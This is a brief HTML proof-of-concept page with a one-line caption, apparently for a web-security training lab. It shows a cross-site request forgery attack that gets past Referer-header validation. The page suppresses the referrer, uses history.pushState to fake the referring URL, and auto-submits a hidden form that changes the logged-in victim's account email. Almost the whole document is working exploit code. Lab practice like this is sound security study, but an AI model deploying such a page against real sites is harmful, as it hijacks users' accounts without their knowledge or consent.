```
<html>
<head>
    <meta name="referrer" content="never">
</head>
<body>
    <form action="https://0a5e0026030b4bec819ea24400d600f5.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="tst@gmail.com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        history.pushState('', '', '/?https://0a5e0026030b4bec819ea24400d600f5.web-security-academy.net/my-account?id=wiener');
        document.forms[0].submit();
    </script>
</body>
</html>

``` 
a sample of poc of csrf that checks for refereal header 